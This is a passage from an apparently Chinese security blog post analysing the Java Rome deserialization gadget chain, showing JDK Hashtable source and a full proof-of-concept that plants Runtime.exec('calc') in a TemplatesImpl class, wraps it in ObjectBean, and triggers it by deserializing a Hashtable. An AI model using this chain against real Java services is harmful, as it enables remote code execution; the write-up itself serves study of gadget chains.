class="line"></span><br><span class="line">    // Compute new size with a bit of room 5% to grow but</span><br><span class="line">    // no larger than the original size.  Make the length</span><br><span class="line">    // odd if it&#x27;s large enough, this helps distribute the entries.</span><br><span class="line">    // Guard against the length ending up zero, that&#x27;s not valid.</span><br><span class="line">    int length = (int)(elements * loadFactor) + (elements / 20) + 3;</span><br><span class="line">    if (length &gt; elements &amp;&amp; (length &amp; 1) == 0)</span><br><span class="line">        length--;</span><br><span class="line">    if (origlength &gt; 0 &amp;&amp; length &gt; origlength)</span><br><span class="line">        length = origlength;</span><br><span class="line">    table = new Entry&lt;?,?&gt;[length];</span><br><span class="line">    threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);</span><br><span class="line">    count = 0;</span><br><span class="line"></span><br><span class="line">    // Read the number of elements and then all the key/value objects</span><br><span class="line">    for (; elements &gt; 0; elements--) &#123;</span><br><span class="line">        @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">            K key = (K)s.readObject();</span><br><span class="line">        @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">            V value = (V)s.readObject();</span><br><span class="line">        // synch could be eliminated for performance</span><br><span class="line">        reconstitutionPut(table, key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>reconstitutionPut里面会调用hashCode，作用和hashcode作用一样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">private void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value)</span><br><span class="line">    throws StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    if (value == null) &#123;</span><br><span class="line">        throw new java.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    // Makes sure the key is not already in the hashtable.</span><br><span class="line">    // This should not happen in deserialized version.</span><br><span class="line">    int hash = key.hashCode();</span><br><span class="line">    int index = (hash &amp; 0x7FFFFFFF) % tab.length;</span><br><span class="line">    for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) &#123;</span><br><span class="line">        if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            throw new java.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // Creates the new entry.</span><br><span class="line">    @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    tab[index] = new Entry&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">public class HashTableExp &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span><br><span class="line">        String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;</span><br><span class="line"></span><br><span class="line">        // 创建恶意类</span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);</span><br><span class="line">        CtClass ctClass = classPool.makeClass(&quot;cccc&quot;);</span><br><span class="line">        ctClass.setSuperclass(classPool.get(AbstractTranslet));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span><br><span class="line">        byte[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        // 创建TemplatesImpl对象</span><br><span class="line">        Object templateImpl = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]&#123;&#125;).newInstance();</span><br><span class="line">        setFiled(templateImpl, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);</span><br><span class="line">        setFiled(templateImpl, &quot;_name&quot;, &quot;test&quot;);</span><br><span class="line">        setFiled(templateImpl, &quot;_tfactory&quot;, null);</span><br><span class="line"></span><br><span class="line">        // 创建ToStringBean对象</span><br><span class="line">        ToStringBean toStringBean = new ToStringBean(Templates.class, templateImpl);</span><br><span class="line">        // 创建ObjectBean对象</span><br><span class="line">        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);</span><br><span class="line">        setFiled(objectBean,&quot;_toStringBean&quot;, null);</span><br><span class="line">        setFiled(objectBean, &quot;_cloneableBean&quot;, null);</span><br><span class="line"></span><br><span class="line">        // 创建HashTable</span><br><span class="line">        Hashtable hashtable = new Hashtable();</span><br><span class="line">        hashtable.put(objectBean, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        // 序列化</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;HashTable.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(hashtable);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        // 反序列化</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;HashTable.bin&quot;));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFiled(Object o, String fieldname, Object value) throws Exception &#123;</span><br><span class="line">        Field field = o.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(o, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后这里小提一下，就是tostring的有XString，EqualsBean，BadAttributeValueExpException</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13286?time__1311=GqmxuD0DnD9D2DUx05bK=Ni=grKhRICeD#toc-19">https://xz.aliyun.com/t/13286?time__1311=GqmxuD0DnD9D2DUx05bK%3DNi%3DgrKhRICeD#toc-19</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Rome"><span class="toc-number">1.</span> <span class="toc-text">Rome</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Rome%E8%A7%A6%E5%8F%91%E6%89%80%E6%9C%89getter"><span class="toc-number">1.1.</span> <span class="toc-text">Rome触发所有getter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HashMap%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.</span> <span class="toc-text">HashMap反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#putVal"><span class="toc-number">1.2.1.</span> <span class="toc-text">putVal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hash"><span class="toc-number">1.2.2.</span> <span class="toc-text">hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HotSwappableTargetSource"><span class="toc-number">1.2.3.</span> <span class="toc-text">HotSwappableTargetSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EqualsBean"><span class="toc-number">1.2.4.</span> <span class="toc-text">EqualsBean</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BadAttributeValueExpException"><span class="toc-number">1.2.5.</span> <span class="toc-text">BadAttributeValueExpException</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashMap%E5%92%8CObjetBean%E7%BB%84%E5%90%88"><span class="toc-number">1.2.6.</span> <span class="toc-text">HashMap和ObjetBean组合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashTable%E5%92%8CObjetBean%E7%BB%84%E5%90%88"><span class="toc-number">1.2.7.</span> <span class="toc-text">HashTable和ObjetBean组合</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/09/Rome/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/09/Rome/&text=Rome"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/09/Rome/&title=Rome"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/09/Rome/&is_video=false&description=Rome"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Rome&body=Check out this article: http://example.com/2025/01/09/Rome/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/09/Rome/&title=Rome"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/09/Rome/&title=Rome"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/09/Rome/&title=Rome"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/09/Rome/&title=Rome"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/09/Rome/&name=Rome&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/09/Rome/&t=Rome"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2003-2025
    Mouri-Kogorou
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
